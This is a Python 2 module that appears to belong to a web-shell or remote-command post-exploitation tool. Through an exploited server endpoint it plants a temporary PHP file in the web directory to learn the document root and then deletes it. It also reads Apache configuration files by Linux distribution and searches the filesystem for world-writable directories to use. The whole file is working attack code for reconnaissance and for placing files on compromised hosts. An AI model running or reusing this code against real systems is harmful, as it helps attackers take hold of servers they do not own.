from urllib2 import urlopen

from core.libs.request_handler import make_request
from core.libs.menu import Colors


class LinuxVersion(object):
    def __init__(self):
        self.url = make_request.url

    def get_doc_root(self):
        cmd = "echo \"<?php echo \$_SERVER['DOCUMENT_ROOT']; ?>\" > ~doc_root.php; [ -r ~doc_root.php ] && echo exists || echo not_exist"
        # Make a request to create a php file (Thanks @0xAli)
        if make_request.get_page_source(cmd)[0] == 'exists':
            make_request.url = make_request.url.replace(make_request.url.split('/')[-1], '~doc_root.php')
            doc_root = urlopen(make_request.url).read().strip()
            make_request.url = self.url
            cmd = "rm ~doc_root.php"
            make_request.get_page_source(cmd)
        else:
            correct_command = ['lsb_release -d', 'cat /etc/*-release']
            for command in correct_command:
                distrib_description = make_request.get_page_source(command)[0].lower()
                if distrib_description:
                    if 'ubuntu' in distrib_description:
                        cmd = "grep -i \"DocumentRoot\" /etc/apache2/sites-available/default | awk '{print $2}'"
                        doc_root = make_request.get_page_source(cmd)[0]
                    elif 'centos' in distrib_description or 'fedora' in distrib_description or 'red hat' in distrib_description:
                        cmd = "grep -i 'DocumentRoot' /etc/httpd/conf/httpd.conf"
                        doc_root = make_request.get_page_source(cmd)[0]
                    else:
                        doc_root = None
                    break
                else:
                    pass

        return doc_root

    def get_writble_dir(self):
        cmd = "find / -perm -0003 -type d 2>/dev/null | sort -R"  # -print -quit
        result = make_request.get_page_source(cmd)
        if result:
            result = result[0]
            print '\n{0}[+] Found a directory to use: \'{1}\'{2}'.format(Colors.GREEN, result, Colors.END)
        else:
            print '\n{0}[!] Unable to find a suitable directory'.format(Colors.RED, Colors.END)
        return result


linux = LinuxVersion()
